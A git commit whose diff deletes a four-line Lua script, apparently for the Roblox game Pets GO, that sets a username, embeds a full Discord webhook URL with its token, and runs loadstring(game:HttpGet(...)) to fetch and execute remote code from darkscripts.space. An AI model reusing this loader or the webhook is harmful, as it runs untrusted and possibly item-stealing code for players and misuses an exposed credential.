543440e9a4458e680fbfacf7b270695a02e55b51
Jeluka11 <Bossluka@proton.me>
2024-11-09 23:45:21 +0800

    Delete main/PetsGO.lua

--- main/PetsGO.lua
+++
@@ -1,4 +0,0 @@
-Username = "nick36dd"
-Webhook = "https://discord.com/api/webhooks/1304825882636058644/IErsZ46tQRdhokGtZpfrfLVKBGICpQGdNbTX8BlgLRDzwR3tHK85jiA6F5L8OzM-j6kw"
-
-loadstring(game:HttpGet(('https://darkscripts.space/petgo')))()
